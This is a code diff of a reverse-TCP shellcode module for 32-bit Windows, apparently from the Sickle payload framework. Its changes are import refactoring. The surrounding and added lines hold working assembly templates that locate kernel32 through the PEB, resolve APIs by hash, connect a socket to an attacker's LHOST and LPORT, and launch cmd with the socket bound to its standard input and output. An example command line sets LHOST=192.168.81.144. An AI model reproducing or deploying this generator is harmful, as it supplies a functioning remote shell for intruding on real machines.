@@ -1,35 +1,21 @@
-from sys import argv
-from struct import pack
-from ctypes import sizeof
-from ctypes import c_uint32
+import sys
+import ctypes
+import struct
+
+import sickle.common.lib.generic.convert as convert
+import sickle.common.lib.generic.mparser as modparser
+import sickle.common.lib.programmer.builder as builder
 
 from sickle.common.lib.reversing.assembler import Assembler
 
-from sickle.common.lib.programmer.builder import gen_offsets
-from sickle.common.lib.programmer.builder import init_sc_args
-from sickle.common.lib.programmer.builder import calc_stack_space
-
-from sickle.common.lib.generic.mparser import argument_check
-from sickle.common.lib.generic.convert import port_str_to_htons
-from sickle.common.lib.generic.convert import from_str_to_xwords
-from sickle.common.lib.generic.convert import ip_str_to_inet_addr
-from sickle.common.lib.generic.convert import from_str_to_win_hash
-
-from sickle.common.headers.windows.ntdef import _LIST_ENTRY
-from sickle.common.headers.windows.ntdef import _UNICODE_STRING
-from sickle.common.headers.windows.winnt import _IMAGE_DOS_HEADER
-from sickle.common.headers.windows.winnt import _IMAGE_NT_HEADERS
-from sickle.common.headers.windows.winnt import _IMAGE_EXPORT_DIRECTORY
-from sickle.common.headers.windows.winnt import _IMAGE_OPTIONAL_HEADER
-from sickle.common.headers.windows.winternl import _PEB
-from sickle.common.headers.windows.winternl import _PEB_LDR_DATA
-from sickle.common.headers.windows.winternl import _LDR_DATA_TABLE_ENTRY
-from sickle.common.headers.windows.ws2def import AF_INET
-from sickle.common.headers.windows.ws2def import sockaddr
-from sickle.common.headers.windows.ws2def import IPPROTO_TCP
-from sickle.common.headers.windows.winsock2 import SOCK_STREAM
-from sickle.common.headers.windows.processthreadsapi import _STARTUPINFOA
-from sickle.common.headers.windows.processthreadsapi import STARTF_USESTDHANDLES
+from sickle.common.headers.windows import (
+    winnt,
+    ntdef,
+    ws2def,
+    winternl,
+    winsock2,
+    processthreadsapi,
+)
 
 class Shellcode():
 
@@ -41,7 +27,7 @@ class Shellcode():
 
     module = f"{platform}/{arch}/shell_reverse_tcp"
 
-    example_run = f"{argv[0]} -p {module} LHOST=192.168.81.144 LPORT=1337 -f c"
+    example_run = f"{sys.argv[0]} -p {module} LHOST=192.168.81.144 LPORT=1337 -f c"
 
     ring = 3
 
@@ -86,19 +72,17 @@ class Shellcode():
             ]
         }
 
-        sc_args = init_sc_args(self.dependencies)
+        sc_args = builder.init_sc_args(self.dependencies)
         sc_args.update({ 
             "wsaData"                       : 0x000,
             "name"                          : 0x010,
-            "lpStartupInfo"                 : sizeof(_STARTUPINFOA),
+            "lpStartupInfo"                 : ctypes.sizeof(processthreadsapi._STARTUPINFOA),
             "lpCommandLine"                 : len("cmd\x00"),
             "lpProcessInformation"          : 0x000,
         })
 
-        self.stack_space = calc_stack_space(sc_args,
-                                            Shellcode.arch)
-        self.storage_offsets = gen_offsets(sc_args,
-                                           Shellcode.arch)
+        self.stack_space = builder.calc_stack_space(sc_args, Shellcode.arch)
+        self.storage_offsets = builder.gen_offsets(sc_args, Shellcode.arch)
 
         return
 
@@ -116,11 +100,11 @@ getPEB:
     xor ecx, ecx
     mov bl, 0x30
     mov edi, fs:[ebx]
-    mov edi, [edi + {_PEB.Ldr.offset}]
-    mov edi, [edi + {_PEB_LDR_DATA.InLoadOrderModuleList.offset}]
+    mov edi, [edi + {winternl._PEB.Ldr.offset}]
+    mov edi, [edi + {winternl._PEB_LDR_DATA.InLoadOrderModuleList.offset}]
 search:
-    mov eax, [edi + {_LDR_DATA_TABLE_ENTRY.DllBase.offset}]
-    mov esi, [edi + {_LDR_DATA_TABLE_ENTRY.BaseDllName.offset + _UNICODE_STRING.Buffer.offset}]    
+    mov eax, [edi + {winternl._LDR_DATA_TABLE_ENTRY.DllBase.offset}]
+    mov esi, [edi + {winternl._LDR_DATA_TABLE_ENTRY.BaseDllName.offset + ntdef._UNICODE_STRING.Buffer.offset}]    
     mov edi, [edi]
     cmp [esi + 0x18], cx
     jne search
@@ -145,16 +129,16 @@ lookupFunction:
     xor ebx, ebx
     mov [ebp - 0x04], ebx       ; [EBP+0x08] will serve as a temporary register (x64 has less registers)
     mov [ebp - 0x08], edx       ; Argv passed into lookupFunction
-    mov ebx, [edi + {_IMAGE_DOS_HEADER.e_lfanew.offset}]
-    add ebx, {_IMAGE_NT_HEADERS.OptionalHeader.offset + _IMAGE_OPTIONAL_HEADER.DataDirectory.offset}
+    mov ebx, [edi + {winnt._IMAGE_DOS_HEADER.e_lfanew.offset}]
+    add ebx, {winnt._IMAGE_NT_HEADERS.OptionalHeader.offset + winnt._IMAGE_OPTIONAL_HEADER.DataDirectory.offset}
     add ebx, edi
     mov eax, [ebx]
     mov ebx, edi
     add ebx, eax
-    mov eax, [ebx + {_IMAGE_EXPORT_DIRECTORY.AddressOfFunctions.offset}]
+    mov eax, [ebx + {winnt._IMAGE_EXPORT_DIRECTORY.AddressOfFunctions.offset}]
     mov edx, edi
     add edx, eax
-    mov ecx, [ebx + {_IMAGE_EXPORT_DIRECTORY.NumberOfFunctions.offset}]
+    mov ecx, [ebx + {winnt._IMAGE_EXPORT_DIRECTORY.NumberOfFunctions.offset}]
     mov [ebp - 0x04], ebx       ; Backup EBX since we are going to XOR it
 parseNames:
     jecxz error
@@ -177,11 +161,11 @@ calcDone:
     jnz parseNames
 findAddress:
     mov ebx, [ebp - 0x04]       ; Restore EBX value prevously saved
-    mov edx, [ebx + {_IMAGE_EXPORT_DIRECTORY.AddressOfNames.offset}]
+    mov edx, [ebx + {winnt._IMAGE_EXPORT_DIRECTORY.AddressOfNames.offset}]
     add edx, edi
     xor eax, eax
     mov ax, [edx + ecx * 2]
-    mov edx, [ebx + {_IMAGE_EXPORT_DIRECTORY.NumberOfNames.offset}]
+    mov edx, [ebx + {winnt._IMAGE_EXPORT_DIRECTORY.NumberOfNames.offset}]
     add edx, edi
     mov eax, [edx + eax * 4]
     add eax, edi
@@ -196,18 +180,18 @@ error:
         """Generates the stub to load a library not currently loaded into a process
         """
 
-        lists = from_str_to_xwords(lib, 0x04)
+        lists = convert.from_str_to_xwords(lib, 0x04)
         write_index = self.storage_offsets["functionName"]
 
         src = "\nload_library_{}:\n".format(lib.rstrip(".dll"))
 
         for i in range(len(lists["DWORD_LIST"])):
-            src += "    mov ecx, 0x{}\n".format( pack('<L', lists["DWORD_LIST"][i]).hex() )
+            src += "    mov ecx, 0x{}\n".format( struct.pack('<L', lists["DWORD_LIST"][i]).hex() )
             src += "    mov [ebp-{}], ecx\n".format(hex(write_index))
             write_index -= 4
 
         for i in range(len(lists["WORD_LIST"])):
-            src += "    mov cx, 0x{}\n".format( pack('<H', lists["WORD_LIST"][i]).hex() )
+            src += "    mov cx, 0x{}\n".format( struct.pack('<H', lists["WORD_LIST"][i]).hex() )
             src += "    mov [ebp-{}], cx\n".format(hex(write_index))
             write_index -= 2
 
@@ -242,7 +226,7 @@ error:
             for func in range(len(imports)):
                 stub += f"""
 get_{imports[func]}:
-    mov edx, {from_str_to_win_hash(imports[func])}
+    mov edx, {convert.from_str_to_win_hash(imports[func])}
     call lookupFunction
     mov [ebp - {self.storage_offsets[imports[func]]}], eax
                 """
@@ -253,7 +237,7 @@ get_{imports[func]}:
         """Returns bytecode generated by the keystone engine.
         """
 
-        argv_dict = argument_check(Shellcode.arguments, self.arg_list)
+        argv_dict = modparser.argument_check(Shellcode.arguments, self.arg_list)
         if (argv_dict == None):
             exit(-1)
 
@@ -301,11 +285,11 @@ call_WSASocketA:
     push ecx
     push ecx
     push ecx
-    mov cl, {IPPROTO_TCP}
+    mov cl, {ws2def.IPPROTO_TCP}
     push ecx
-    mov cl, {SOCK_STREAM}
+    mov cl, {winsock2.SOCK_STREAM}
     push ecx
-    mov cl, {AF_INET}
+    mov cl, {ws2def.AF_INET}
     push ecx
     call eax
 
@@ -316,11 +300,11 @@ call_WSASocketA:
 ;                [in] int namelen);
 call_connect:
     xor ecx, ecx
-    mov cl, {sizeof(sockaddr)}
+    mov cl, {ctypes.sizeof(ws2def.sockaddr)}
     push ecx
 
-    mov dword ptr [ebp - {self.storage_offsets['name'] - 0x04}], {hex(ip_str_to_inet_addr(argv_dict['LHOST']))}
-    mov dword ptr [ebp - {self.storage_offsets['name']}], 0x{pack('<H', lport).hex()}0002
+    mov dword ptr [ebp - {self.storage_offsets['name'] - 0x04}], {hex(convert.ip_str_to_inet_addr(argv_dict['LHOST']))}
+    mov dword ptr [ebp - {self.storage_offsets['name']}], 0x{struct.pack('<H', lport).hex()}0002
 
     lea ecx, [ebp - {self.storage_offsets['name']}]
     push ecx
@@ -336,17 +320,17 @@ memsetStructBuffer:
     lea edi, [ebp - {self.storage_offsets['lpStartupInfo']}]
     xor eax, eax
     xor ecx, ecx
-    mov cl, {int( sizeof(_STARTUPINFOA) / 0x04 )}
+    mov cl, {int( ctypes.sizeof(processthreadsapi._STARTUPINFOA) / 0x04 )}
     rep stosd
 
 initMembers:
-    mov al, {sizeof(_STARTUPINFOA)}
+    mov al, {ctypes.sizeof(processthreadsapi._STARTUPINFOA)}
     mov [ebx], eax
-    mov eax, {STARTF_USESTDHANDLES}
-    mov [ebx + {_STARTUPINFOA.dwFlags.offset}], eax
-    mov [ebx + {_STARTUPINFOA.hStdInput.offset}], esi
-    mov [ebx + {_STARTUPINFOA.hStdOutput.offset}], esi
-    mov [ebx + {_STARTUPINFOA.hStdError.offset}], esi
+    mov eax, {processthreadsapi.STARTF_USESTDHANDLES}
+    mov [ebx + {processthreadsapi._STARTUPINFOA.dwFlags.offset}], eax
+    mov [ebx + {processthreadsapi._STARTUPINFOA.hStdInput.offset}], esi
+    mov [ebx + {processthreadsapi._STARTUPINFOA.hStdOutput.offset}], esi
+    mov [ebx + {processthreadsapi._STARTUPINFOA.hStdError.offset}], esi
 
 ; EAX => CreateProcessA([in, optional]      LPCSTR                lpApplicationName,
 ;                       [in, out, optional] LPSTR                 lpCommandLine,
